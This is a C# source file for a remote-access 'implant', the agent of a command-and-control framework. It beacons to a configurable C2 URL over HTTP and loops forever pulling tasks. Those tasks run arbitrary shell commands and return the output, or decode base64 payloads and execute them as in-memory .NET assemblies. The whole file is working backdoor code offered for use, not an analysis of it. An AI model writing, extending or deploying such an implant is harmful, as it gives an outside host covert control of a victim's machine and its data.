using System;
using System.Linq;
using System.Threading;
using System.IO;
using System.Text.Json;
using System.Collections.Generic;

namespace Implant
{
    class Implant
    {


        private CommunicationProviderInterface comprov;

        private string name;

        private Config config;

        public Implant(string c2Url)
        {
            //By Default we wait 5 sec between asking for stuff unless its update. Need to add some randomness in there but thats for later
            this.name = generateImplantName();

            this.comprov = new HTTPCommunicationProvider(c2Url, this.name);

            this.comprov.keyExchangeSetup();
            //Get config aka time between request + comm method. A bit weird to get comm method after I already interacted over HTTP but wtv todo lol
            this.config = this.comprov.getConfig();


            //This is where we pull new tasks and post the results
            while (true)
            {
                Thread.Sleep(this.config.pullInterval);

                Task task = this.comprov.getNextTask();

                if (task.taskName == "cmdExecute")
                {
                    var result = Modules.CmdExecute.cmdExecute(task.payload);
                    this.comprov.updateTaskResult(task.UUID, result);
                }
                else if(task.taskName == "assemblyLoad")
                {
                  
                    Byte[] payload = Convert.FromBase64String(task.payload);
                    var result = Modules.AssemblyLoader.ExecuteAssembly(payload);
                }
                else if (task.taskName == "nullTask")
                {

                    //do nothing its a null task
                }
                else if (task.taskName == "updateConfig")
                {
                    this.config = this.comprov.getConfig();
                }

            }
        }

       
        private string generateImplantName()
        {
              Random random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, 10)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }



    }
}
